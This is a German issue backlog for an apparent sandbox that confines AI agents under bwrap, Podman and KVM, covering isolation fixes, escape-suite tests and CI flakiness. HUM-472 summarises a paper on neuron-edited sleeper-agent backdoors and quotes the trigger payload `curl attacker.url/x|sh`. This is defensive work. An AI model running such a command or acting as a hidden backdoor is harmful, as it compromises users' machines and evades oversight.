Bestandsaufnahme beim nächsten Start des Daemons; der normale Endpfad in
`ipc` ruft kein `terminate` (Bericht des Agenten zu HUM-433, 2026-11-12).
`--rm` gehörte dem beendeten Client und greift nicht mehr.

### Spezifikation
1. Endet der Client einer Podman-Sitzung, ohne dass ein Stopp angefordert
   war, entfernt der Daemon den Container über die Engine, sobald er
   beendet ist, und meldet ein Scheitern als `SANDBOX_041`.

### Tests
- Live (Probe `podman_here`): Client per `SIGKILL` beenden, ohne `kill`
  der Sitzung; nach `KILL_GRACE` plus Frist ist der Container auch in
  `ps --all` weg. Mutationsbeweis: ohne den neuen Aufruf rot.

### Akzeptanzkriterien
1. Nach einem ungeplanten Ende bleibt kein beendeter Container liegen.

### Fallstricke
- Nicht doppelt entfernen, wenn gleichzeitig ein Stopp läuft.

---

## HUM-453 · Podman: the host's `/sys` is hidden in the container, as under bwrap

### Kontext
Der erste Lauf der Escape-Suite gegen Podman (HUM-435, 2026-11-12) war rot
in `esc-2/no_host_sys`: Podman hängt `/sys` des Rechners in jeden Container
nur lesbar ein, bwrap gibt keines. Der Agent sähe unter Podman mehr vom
Rechner als unter bwrap; Podman darf in keiner Hinsicht schwächer isolieren.

### Spezifikation
1. Jede Startzeile des Podman-Adapters legt je ein leeres, nur lesbares tmpfs
   über `/sys` und über Podmans eigenes `/sys/fs/cgroup` darunter; die
   Vorschau zeigt beide als maskiert. Die Grenzen der cgroup gelten weiter.
2. `docs/SECURITY.md` Abschnitt 13 (en, de) nennt es.

### Tests
- Unit: jede Zeile trägt das tmpfs über `/sys`. Mutationsbeweis: ohne den
  Aufruf rot.
- Live: die Podman-Tests bleiben grün; `esc-2/no_host_sys` wird unter
  Podman grün (Lauf in HUM-435).

### Akzeptanzkriterien
1. `esc-2/no_host_sys` ist unter Podman grün.

## HUM-454 · Podman: the user's `mounts.conf` reaches no container

### Kontext
Der erste CI-Lauf von `escape-tests-podman` (HUM-435, 2026-11-12, Podman
4.9.3) war rot in `esc-2/no_engine_secrets` und im Live-Test
`the_users_configuration_does_not_reach_the_container`: Eine
`~/.config/containers/mounts.conf`, die ein Prozess desselben Nutzers anlegt
(THREAT-MODEL K-27), hängt ihre Quellen in jede Sandbox ein. Der Eintrag
`default_mounts_file` in der `containers.conf` des Adapters hält sie nicht
fern, weder unter 4.9.3 noch unter 5.8.6 (Diagnose auf dem Zweig
`hum-435-diag` und lokal): Podman liest die Datei des Nutzers zusätzlich.
Allein das globale Flag `--default-mounts-file` ersetzt die Liste. Eine
`mounts.conf` kann jedes Ziel nennen, ein tmpfs über `/run/secrets` genügt
deshalb nicht. Lokal blieb die Suite grün, weil dort keine solche Datei lag;
der Live-Test prüfte nur den Weg über `CONTAINERS_CONF_OVERRIDE`, den der
Adapter ohnehin entfernt.

### Spezifikation
1. Jede Startzeile des Adapters (`podman run`, der einzige Aufruf, der einen
   Container anlegt) trägt `--default-mounts-file=<leere Datei des Adapters>`
   als globales Flag vor `run`; der Eintrag in der `containers.conf` bleibt
   als zweite Linie.
2. `docs/SECURITY.md` Abschnitt 13 (en, de) nennt das Flag und warum der
   Eintrag in der Konfiguration nicht genügt.

### Tests
- Unit: jeder Befehl des Adapters trägt das Flag vor dem Unterbefehl.
  Mutationsbeweis: ohne das Flag rot.
- Live: `the_users_configuration_does_not_reach_the_container` im CI-Job
  `escape-tests-podman`, nach der gepflanzten `~/.config/containers/mounts.conf`
  des Runners (HUM-435); ein eigenes `HOME` im Test gäbe Podman einen zweiten
  Speicher neben dem `runroot` des Nutzers. Mutationsbeweis: ohne das Flag rot
  (der Lauf vor diesem Issue, 2026-11-12).

### Akzeptanzkriterien
1. `esc-2/no_engine_secrets` und der Live-Test sind unter Podman 4.9 (CI) und
   5.x (lokal) grün.

---

## HUM-455 · CI: the Podman escape suite also runs with an image as the root

### Kontext
HUM-439 macht ein Abbild mit Digest zur möglichen Wurzel der Sandbox. Die
Escape-Suite kann es über `HUMANITL_ESCAPE_IMAGE` nutzen, und lokal liefen
die ESC-2-Fälle damit grün (CA und Bündel vom Host, `/etc/shadow` und
`/etc/machine-id` nicht die des Hosts). Ein CI-Job dafür fehlt, und auf
`debian:trixie-slim` fehlen `python3` und `curl`, so dass 59 Fälle
übersprungen und 4 rot wurden (Review HUM-439, 2026-11-13).

### Spezifikation
1. Der Job `escape-tests-podman` baut aus einem festen Basisabbild ein
   Testabbild mit den Helfern der Suite (`python3`, `curl`, `stat`), nennt es
   per Digest und fährt die Suite ein zweites Mal mit
   `HUMANITL_ESCAPE_IMAGE`.
2. Ziehen und Bauen des Basisabbilds geschehen vor dem Start des Daemons und
   außerhalb jeder Sandbox; der Lauf mit Abbild zieht nichts.

### Tests
- Der zweite Lauf hat keine Fälle, die wegen fehlender Helfer übersprungen
  werden (`ESCAPE_NO_SKIP=1`).

### Akzeptanzkriterien
1. Beide Läufe sind in der CI grün.

---

## HUM-456 · Podman: credentials for a pull come from a file of the adapter

### Kontext
`humanitl sandbox image pull` (HUM-439) lässt die Engine ihre gewohnten
Zugangsdaten lesen, etwa `$XDG_RUNTIME_DIR/containers/auth.json`. Welche
Datei das ist, entscheidet die Engine, nicht Humanitl (Review HUM-439).

### Spezifikation
1. Das Ziehen trägt `--authfile` mit einer Datei, die der Adapter nennt;
   ohne eingerichtete Zugangsdaten zieht es anonym.
2. `docs/cli.md` (en, de) sagt, woher die Zugangsdaten kommen.

### Tests
- Unit: die Zeile des Ziehens trägt das Flag. Mutationsbeweis: ohne rot.

### Akzeptanzkriterien
1. Ein Ziehen liest keine Zugangsdaten außer der genannten Datei.

---

## HUM-457 · A running image pull can be cancelled

### Kontext
Das Ziehen eines Abbilds (HUM-439) läuft bis zu 30 Minuten und lässt sich
weder in der CLI noch in der App abbrechen (Review HUM-439).

### Spezifikation
1. `Ctrl-C` in `humanitl sandbox image pull` und ein Knopf „Abbrechen" in der
   Karte beenden das Ziehen über einen eigenen RPC; der Daemon beendet den
   Prozess der Engine.

### Tests
- Unit mit einer Engine, die nicht antwortet: Abbruch binnen 1 s.

### Akzeptanzkriterien
1. Nach dem Abbruch läuft kein Prozess des Ziehens mehr.

---

## HUM-458 · PID-1 integration tests fail in CI instead of skipping without a usable sandbox

### Kontext
`tests/shim.rs` und `tests/door_backpressure.rs` überspringen still, wenn
bwrap oder Nutzer-Namespaces fehlen. Sperrt ein Runner Namespaces (AppArmor),
wären beide grün, ohne etwas geprüft zu haben (Review HUM-451, 2026-11-13).

### Spezifikation
1. Unter `STRICT=1` (wie in der CI) wird das Überspringen zu einem Fehler mit
   dem Grund.

### Tests
- Mutationsbeweis: ein unbrauchbares `bwrap` auf dem `PATH` mit `STRICT=1`
  macht den Lauf rot.

### Akzeptanzkriterien
1. Kein PID-1-Integrationstest ist in der CI ohne Sandbox grün.

---

## HUM-459 · Constants that tests copy from the shim stay in step with it

### Kontext
`tests/door_backpressure.rs` schreibt `KILL_GRACE`, die Höchstzahl weiterer
Shells und den Wortlaut der Warnung aus dem Shim ab. Ändert sich einer davon,
wird der Test still strenger oder lockerer (Review HUM-451).

### Spezifikation
1. Die Werte kommen aus einer gemeinsamen Quelle, die Shim und Tests lesen,
   oder ein Test vergleicht sie mit dem Shim.

### Tests
- Mutationsbeweis: ein geänderter Wert im Shim macht den Abgleich rot.

### Akzeptanzkriterien
1. Kein Test hält eine eigene Kopie dieser Werte, die unbemerkt abweicht.

---

## HUM-460 · Config: the description of `sandbox.podman` names the admission of Podman

### Kontext
Der Doc-Kommentar der Gruppe `sandbox.podman` in
`daemon/crates/config/src/model.rs` sagt noch, jeder Start mit Podman lehne mit
`SANDBOX_048` ab. Seit HUM-448 ist die gemeinsame Stufe (`crun`) zugelassen;
abgelehnt wird nur noch `krun` bis HUM-449. Der Text steht auch im Schema und
damit in jedem Editor, der es liest (Review HUM-441, 2026-11-13).

### Spezifikation
(Seit HUM-442 fällt `krun` mit HUM-464 ganz weg; dann zieht HUM-464 den Text nach.)

1. Der Doc-Kommentar beschreibt den Stand: `crun` wählbar, `krun` lehnt jeder
   Start bis zur Zulassung der Kernel-Stufe mit `SANDBOX_048` ab.
2. Schema-Fixture und `docs/CONFIG.md` folgen aus der Quelle, nicht von Hand.

### Tests
- Der vorhandene Abgleich von Schema und Fixture bleibt grün.

### Akzeptanzkriterien
1. Kein Text in Konfiguration, Schema oder `docs/CONFIG.md` behauptet, Podman
   sei als Ganzes nicht wählbar.

---

## HUM-461 · RPM and AUR recommend Podman like the .deb

### Kontext
Das .deb nennt seit HUM-441 `podman` und `uidmap` unter `Recommends`. Das RPM
und das AUR-Paket nennen Podman nicht; wer dort das Backend wählt, bekommt nur
die Diagnose von `doctor`.

### Spezifikation
1. RPM: `Recommends: podman` und die Werkzeuge der Unter-IDs als Datei
   (`/usr/bin/newuidmap`), weil sie auf Fedora und openSUSE in verschiedenen
   Paketen stehen. Nie `Requires`: bubblewrap bleibt das einzige Pflicht-Backend.
2. AUR: `podman` unter `optdepends` mit einer Zeile, wofür.

### Tests
- `packaging/rpm` und `packaging/aur` bestehen ihre vorhandenen Prüfungen
  (rpmlint, `check-aur.sh`).

### Akzeptanzkriterien
1. Keines der drei Pakete verlangt Podman; alle drei schlagen es vor.

---

## HUM-462 · Website: Podman as a selectable backend on the security page

### Kontext
Die Sicherheitsseite der Website beschreibt unter Linux nur bubblewrap. Die
Dokumente unter `docs/` erscheinen dort schon mit Podman, die eigenen Texte der
Seite nicht.

### Spezifikation
1. Der erste Schritt von „The journey of one request" (`en.ts`, `de.ts`) nennt
   Podman mit `crun` als wählbares Backend derselben Stufe, mit Verweis auf
   SECURITY.md Abschnitt 13.
2. Die Liste der vertrauten Basis (`Security.astro`, `tcb`) nennt Podman, `crun`
   und `conmon`, wenn das Backend gewählt ist, wie SECURITY.md.

### Tests
- `npm run build` der Website und die vorhandenen Link-Prüfungen grün.

### Akzeptanzkriterien
1. Kein Satz der Seite sagt, Linux kenne nur bubblewrap.

---

## HUM-463 · German translation of ADR-0020 and the German ADR index

### Kontext
ADR-0020 (Podman als Backend) ist seit HUM-441 angenommen, hat aber keine
deutsche Fassung unter `docs/translations/de/adr/`, und der deutsche Index
führt sie nicht.

### Spezifikation
1. `docs/translations/de/adr/0020-podman-sandbox-backend.md` mit dem Kopf, den
   die übrigen Übersetzungen tragen (Quelle und deren Prüfsumme).
2. Der deutsche ADR-Index führt ADR-0020.

### Tests
- `make lint-docs`, die Linkprüfung und die Prüfung der Übersetzungsköpfe grün.

### Akzeptanzkriterien
1. Die deutsche Fassung sagt dasselbe wie das Original, Stand HUM-441.

---

## HUM-466 · Kernel level: writable `/tmp`, `$HOME` and `/run` in the guest

### Kontext
Aus dem Review von HUM-444 (Kandidat). Die Wurzel des Gasts kommt nur lesbar
über virtiofs; die Zeilen des Plans, die unter bwrap ein tmpfs sind (`/tmp`,
`$HOME`, `/run`), werden im Gast zu leeren, nur lesbaren Verzeichnissen. Ein
Agent, der in `/tmp` oder sein Home schreibt, scheitert. `mounts.extra_rw` ist
im Gast ebenfalls nur lesbar.

### Spezifikation
1. Der Gastplan nennt die tmpfs-Zeilen; der Shim hängt sie im Gast als tmpfs
   ein, vor dem Start des Agenten, mit Größe und Rechten wie unter bwrap.
2. `socket_walk` des Gastplans umfasst diese Orte, damit `single_socket` sie
   durchsucht.
3. `mounts.extra_rw` unter der Kernel-Stufe: entweder über `/work` erreichbar
   oder mit eigener Diagnose abgelehnt, nie stillschweigend nur lesbar.

### Tests
- KVM: der Agent schreibt nach `/tmp` und `$HOME`; die Mounttabelle des Gasts
  passt zum Plan.
- Mutationsbeweis: ohne das Einhängen färbt der Test rot.

### Akzeptanzkriterien
1. Ein Agent unter `qemu` hat dieselben beschreibbaren Orte wie unter bwrap.
2. Vor HUM-449 gelandet.

---

## HUM-467 · Kernel level: a cap on door connections per session

### Kontext
Aus dem Review von HUM-444 (Kandidat). `serve_door` startet je Verbindung des
Gasts zwei Fäden und hält vier Deskriptoren. Ein Gast mit Root kann beliebig
viele Verbindungen öffnen und Fäden und Deskriptoren des Daemons erschöpfen,
was auch andere Sitzungen trifft.

### Spezifikation
1. Eine feste Obergrenze gleichzeitiger Verbindungen je Sitzung (etwa 64);
   darüber wird die neue Verbindung sofort geschlossen und einmal je Sitzung
   ins Audit geschrieben.
2. Optional ein gemeinsames Limit über alle Sitzungen.

### Tests
- Unit: die 65. Verbindung wird geschlossen, die übrigen arbeiten weiter.
- Mutationsbeweis: ohne Grenze färbt der Test rot.

### Akzeptanzkriterien
1. Kein Gast kann die Fäden oder Deskriptoren des Daemons unbegrenzt binden.

---

## HUM-468 · Kernel level: the host check knows the programs of the unit

### Kontext
Aus dem Review von HUM-444 (Kandidat). Die Host-Prüfung prüft Netz, Geräte,
Deskriptoren und Sockets, aber nicht, welche Programme in der Unit laufen. Ein
unerwarteter Prozess fiele nur auf, wenn er ein Netzgerät oder ein Gerät
hält.

### Spezifikation
1. Jeder Prozess der Unit ist eines von: `sh` des Skripts, `bwrap`, dem Shim,
   den vier Helfern (kanonische Pfade aus `Resolved`); alles andere ist ein
   Fund unter `SANDBOX_047`.

### Tests
- Unit über eine Fixture von `/proc`; KVM: grüne Sitzung bleibt grün.
- Mutationsbeweis: ein zusätzlicher `sleep` in der Unit färbt die Prüfung rot.

### Akzeptanzkriterien
1. Ein unbekanntes Programm in der Unit beendet die Sitzung mit `SANDBOX_047`.

---

## HUM-469 · Kernel level: a descriptor limit for the virtiofsd processes

### Kontext
Gefunden in HUM-445: Ein Walk über die Wurzel des Gasts ließ den virtiofsd der
Wurzel rund 520 000 Deskriptoren öffnen (`No more file descriptors available
to the guest (0 of 523678)`), danach `ENFILE` im Gast. Ein Gast mit Root kann
so Kernel-Speicher des Hosts binden und die Wurzel für sich selbst
unbrauchbar machen.

### Spezifikation
1. Die virtiofsd-Prozesse bekommen eine feste Grenze der Deskriptoren
   (`--rlimit-nofile` oder `LimitNOFILE` der Unit), dazu eine Cache-Einstellung,
   die Inodes nicht unbegrenzt offen hält, soweit virtiofsd 1.13 sie kennt.
2. Erreicht der Gast die Grenze, bleibt die Sitzung bedienbar oder endet mit
   einer Diagnose; der Host bleibt unberührt.

### Tests
- KVM: ein Walk über die ganze Wurzel im Gast; die Zahl der Deskriptoren des
  virtiofsd bleibt unter der Grenze.
- Mutationsbeweis: ohne Grenze steigt die Zahl darüber.

### Akzeptanzkriterien
1. Kein Gast kann einen virtiofsd über eine feste Zahl Deskriptoren treiben.
2. Vor HUM-449 gelandet.

## HUM-470 · Kernel level: two intermittent failures on CI

### Kontext
Gefunden beim Landen von HUM-445: Im CI-Lauf 43567140980 fiel
`qemu::kvm_tests::the_shim_as_init_locks_modules_and_the_door_answers_after_the_filter`
mit `no CHECK bridge_listening`, der Bericht des Shims enthielt also keine
einzige Prüfzeile. Lokal ist der Test grün, auch mit dem Gastkernel der CI
(6.12.115 cloud), und im nächsten Lauf (43571942098) war er auf demselben Stand
grün. Ebenso `esc-2/unplanned_mount` im Job escape-tests-qemu: in den Läufen
43567140980 und 43571942098 mit Exit 3 abgewiesen, aber nicht mit
`SANDBOX_049`, im Lauf 43573771650 auf fast demselben Stand grün; die Meldung
nennt seit HUM-445 die letzte Zeile von escape-launch. Ein Test der Kernel-Stufe, der nur manchmal rot ist, verdeckt einen
echten Fehler genauso wie einer, der zufällig grün ist.

### Spezifikation
1. Ursache aus der Konsole des Gasts bestimmen (der Schritt „Guest console
   after a failure" schreibt seit HUM-445 die ganze Ausgabe jedes gefallenen
   Tests in eine Annotation): Zeitgrenze des Berichts, Start von virtiofsd
   1.13, Last des Runners.
2. Beheben, nicht wiederholen: kein Retry im Test oder in der CI.

### Tests
- Die Jobs kvm-tests und escape-tests-qemu zehnmal hintereinander auf demselben
  Commit grün.

### Akzeptanzkriterien
1. Ursache benannt und behoben, oder als Eigenschaft des Runners begründet und
   mit einer Diagnose versehen, die sie im Lauf eindeutig nennt.

### Stand nach der Umsetzung (2026-11-14)
`esc-2/unplanned_mount` ist behoben (die Diagnose des Gasts bleibt stehen,
wenn die Unit vor der Host-Prüfung endet; KVM-Test erzwingt die Reihenfolge).
Der kvm-Test ohne CHECK-Zeile ist nicht behoben: Die vermutete Ursache (eine
nach 5 s aufgegebene vsock-Anfrage) ist gemessen widerlegt, der Fall lokal
einmal reproduziert und jetzt richtig gemeldet („the sandbox ended after 32.1s
of 60s … before its report"). Er geht als HUM-471 weiter, ebenso der Nachweis
der zehn grünen Läufe.

## HUM-471 · Kernel level: the guest that never gets the host's connections

### Kontext
Aus HUM-470. In der CI (Lauf 43580902135) und einmal lokal mit dem Gastkernel
der CI fiel `qemu::kvm_tests::a_session_starts_through_the_adapter_with_a_green_host_check`:
`no CHECK line from the shim; the sandbox ended after 32.1s of 60s (exit
status: 0) before its report; host: the unit … has ended`. Der Gast wartete
also `REPORT_WAIT` (30 s) auf die zwei Verbindungen des Hosts und schaltete
sauber ab; der Host bekam in dieser Zeit kein `OK` von vhost-device-vsock.
Beide Male lief der Test direkt nach
`a_module_that_cannot_load_powers_the_guest_off_before_the_agent`. Gemessen ist:
Das Gerät beantwortet jedes `CONNECT` binnen Millisekunden, eine Absage kommt
sofort, solange der Gast nicht lauscht. Vermutlich ein Start-Wettlauf zwischen
Gerät und QEMU oder die Probe des vsock-Treibers im Gast; ohne Konsole des
Gasts ist das nicht lesbar. Verwandt: `no CHECK bridge_listening` im
`test_vm`-Pfad (Lauf 43567140980).

### Spezifikation
1. Im Fehlerfall die Konsole des Gasts auch im Adapterpfad sichern (nur für
   Tests und CI, nie im gegateten Lauf mit Konsole), und den Fall damit
   bestimmen.
2. Ursache beheben, nicht wiederholen: kein Retry im Test oder in der CI.
3. Bericht und Steuerkanal per Hello-Zeile mit Rolle kennzeichnen statt per
   Reihenfolge der Verbindungen, falls die Ursache darin liegt.

### Tests
- Die Jobs kvm-tests und escape-tests-qemu zehnmal hintereinander auf demselben
  Commit grün.
- Ein KVM-Test, der den gefundenen Wettlauf erzwingt; Mutationsbeweis.

### Akzeptanzkriterien
1. Ursache benannt und behoben, oder als Eigenschaft des Runners begründet und
   mit einer Diagnose versehen, die sie im Lauf eindeutig nennt.
2. Vor HUM-449 gelandet.

## HUM-472 · Website: the model as the attacker, with sources

### Kontext
Wunsch des Owners (2026-11-14). Microsoft Research und das Microsoft AI Red
Team haben gezeigt, dass das Umschreiben von weniger als zehn ruhenden Neuronen
ein offenes Modell zum Schläfer macht, der jede Evaluation besteht und auf einen
Auslöser hin `curl attacker.url/x|sh` ausführt (Zeng, Severi, Bullwinkel,
Horvitz, Papailiopoulos, „Lazare, veni foras: Reprogramming Dormant Neurons to
Backdoor AI Agents“, 2026). Das Paper sagt selbst: „the scale of the attack is
bounded by the agent's permissions, not the size of the edit“, und empfiehlt
Anwendern, Rechte zu begrenzen, Befehle, Dateien und Netzaufrufe zu
protokollieren und vor Befehlen, Änderungen und Daten nach außen eine Freigabe
zu verlangen. Genau das ist Humanitl; ein guter, belegter Aufhänger für das
Risiko, das wir angehen.

### Spezifikation
1. Startseite: ein kurzer Kasten vor der Sektion „Vier Versuche“ (de + en),
   im Wortlaut des vom Owner bestätigten Entwurfs:
   - Überschrift „Wenn das Modell selbst der Angreifer ist“ / „When the model
     itself is the attacker“.
   - Sieben Neuronen, jede Prüfung bestanden, `2027-01-01` im Terminal,
     `curl attacker.url/x|sh`; Fazit der Autoren: die Rechte des Agenten
     entscheiden über den Schaden, nicht der Eingriff ins Modell.
   - Was Humanitl daraus macht: der Download aus dem Beispiel hält am Proxy,
     bis der Nutzer freigibt; der Agent sieht nur sein Projekt; jede
     Verbindung wird protokolliert. Ausdrücklich: Humanitl erkennt keine
     manipulierten Modelle, es nimmt ihnen ohne Zustimmung die Wirkung.
   - Fußnote mit Quelle.
2. Sicherheitsseite, Kapitel „Was offen bleibt“ (`#grenzen`): ein Absatz zum
   manipulierten Modell als Gegner mit denselben Quellen, über die vorhandene
   Quellen-Komponente (`Src`), dazu die ehrliche Einordnung: setzt
   Schreibzugriff auf die Gewichte voraus (manipulierter Checkpoint auf einem
   öffentlichen Hub, Insider), laut Microsoft bisher nicht in freier Wildbahn
   beobachtet; Humanitl erkennt die Manipulation nicht, begrenzt die Wirkung.
3. Quellen, nur diese: das Paper (PDF
   https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf),
   der Code (https://github.com/microsoft/lazarus, sobald öffentlich), der Blog von Microsoft Threat Intelligence vom 10.11.2026
   (https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/,
   Beleg für „bisher nicht beobachtet"), als Zweitquelle InfoWorld
   vom 11.11.2026
   (https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html).
   Jede Zahl und jedes Zitat aus dem Paper; keine Quelle, deren URL nicht
   geprüft ist.

### Tests
- `website` baut; Link- und Übersetzungsprüfung (`scripts/check-links.mjs`,
  `scripts/check-translations.mjs`) grün.
- Screenshot beider Stellen (hell und dunkel, Desktop und Telefonbreite) vor
  dem Commit, an den Owner.

### Akzeptanzkriterien
1. Beide Stellen in de und en, jede Aussage über das Paper mit Quelle.
2. Keine Aussage, Humanitl erkenne Backdoors; keine Aussage, der Angriff sei
   schon im Einsatz beobachtet.

## HUM-475 · Website: German copy of the home and security pages

### Kontext
Rückmeldung des Owners vom 2026-11-14: Die deutschen Texte auf der
Startseite und der Sicherheitsseite sind teilweise sehr holprig, auch
grammatikalisch. Viele Sätze lesen sich wie wörtlich aus dem Englischen
übertragen.

### Spezifikation
1. Jeder deutsche Text der Startseite und der Sicherheitsseite
   (`website/src/i18n/locales/de.ts`, Schlüssel `home` und `security`, dazu
   gemeinsame Teile, die auf beiden Seiten stehen) wird geprüft und, wo
   nötig, neu formuliert: korrekte Grammatik und Zeichensetzung, natürlicher
   deutscher Satzbau statt Übersetzungsdeutsch, kurze Sätze statt
   Bandwurmsätzen, durchgehend „du", ein Begriff für eine Sache.
2. Der Inhalt bleibt: keine Aussage wird stärker oder schwächer, keine Zahl,
   kein Code, kein Verweis ändert sich. Fachbegriffe, Bezeichner, Befehle
   und Codes bleiben exakt.
3. Die englischen Texte bleiben unverändert, außer ein Fehler dort zeigt
   sich beim Abgleich.

### Tests
- `website` baut; Link- und Übersetzungsprüfung grün.
- Vorher-Nachher-Liste der geänderten Sätze und Screenshots für den Owner
  vor dem Commit.

### Akzeptanzkriterien
1. Kein grammatikalischer Fehler mehr in den deutschen Texten beider Seiten.
2. Jede Sicherheitsaussage gleich stark wie vorher, geprüft gegen
   `docs/SECURITY.md`.

## HUM-476 · Kernel level: the guest's file cache back on, but bounded

### Kontext
Aus HUM-469. Damit die feste Grenze von 65 536 Deskriptoren für virtiofsd
hält, laufen beide virtiofsd mit `--cache never`: Mit dem Standard-Cache
behält der Gast je Inode einen Dentry, bis der Speicher knapp wird, und
virtiofsd hält je Inode einen Deskriptor; ein einfaches `ls -lR` erreichte die
Grenze (Lauf endete nach 71 470 Einträgen mit `ENFILE`). Der Preis, gemessen
in HUM-469 (`--cache never` gegen `auto`): `cp -r /usr/include` 20 s gegen
5 s, `git add` 27,6 s gegen 11 s, `grep -r` 3,3 s gegen 1,7 s, `git status`
1,7 s gegen 0,3 s, `ls -lR /usr/share/doc` 33 s gegen 2 s. Entscheidung des
Owners vom 2026-11-14: jetzt sicher landen, die Geschwindigkeit vor der
Zulassung (HUM-449) zurückholen.

### Spezifikation
1. Der Cache des Gasts wird wieder eingeschaltet (`--cache auto` oder
   `metadata`), aber die Zahl der Inodes, die der Gast hält, bleibt
   begrenzt, deutlich unter der Grenze der Deskriptoren. Kandidaten, zu
   messen: der Shim gibt im Gast Dentries und Inodes frei, sobald ihre Zahl
   eine Schwelle überschreitet (`/proc/sys/fs/dentry-state`,
   `vm.drop_caches=2`, `vfs_cache_pressure`), oder eine Option von virtiofsd
   1.13, die geöffnete Inodes begrenzt.
2. Die Grenze von 65 536 Deskriptoren bleibt, und der KVM-Test aus HUM-469
   bleibt grün; ein Walk über die ganze Wurzel endet nicht mehr mit
   `ENFILE`.

### Tests
- Dieselben Messungen wie in HUM-469, Ziel: höchstens das Doppelte der Zeit
  mit `auto`.
- KVM-Test aus HUM-469 grün, dazu ein Walk über die Wurzel ohne `ENFILE`.

### Akzeptanzkriterien
1. Kein Gast treibt einen virtiofsd über die feste Grenze.
2. Die Messwerte liegen höchstens beim Doppelten von `auto`.
3. Vor HUM-449 gelandet.
